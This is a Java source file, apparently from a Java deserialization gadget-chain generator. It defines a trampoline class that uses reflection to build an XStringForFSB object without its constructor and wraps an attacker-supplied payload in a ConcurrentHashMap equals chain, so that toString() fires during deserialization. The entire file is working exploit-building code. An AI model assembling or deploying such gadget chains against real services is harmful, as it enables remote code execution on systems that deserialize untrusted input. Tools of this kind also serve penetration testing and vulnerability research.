package org.ses.gadgetbuilder.impl.trampolines.tostring;

import com.sun.org.apache.xpath.internal.objects.XStringForFSB;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.chains.trampolines.noparam.ToStringTrampoline;
import org.ses.gadgetbuilder.impl.trampolines.equals.ConcurrentHashMapEquals;
import org.ses.gadgetbuilder.util.Reflections;

@Authors(Authors.BofeiC)
public class XStringForFSBToStringTrampoline implements ToStringTrampoline {
    @Override
    public Object wrapPayload(Object payload) throws Exception {
        XStringForFSB xStringForFSB = Reflections.createWithoutConstructor(XStringForFSB.class);
        Reflections.setFieldValue(xStringForFSB, "m_strCache", "foo");
        ConcurrentHashMapEquals equalsTrampoline = new ConcurrentHashMapEquals();

        return equalsTrampoline.wrapPayload(xStringForFSB, payload);
    }
}
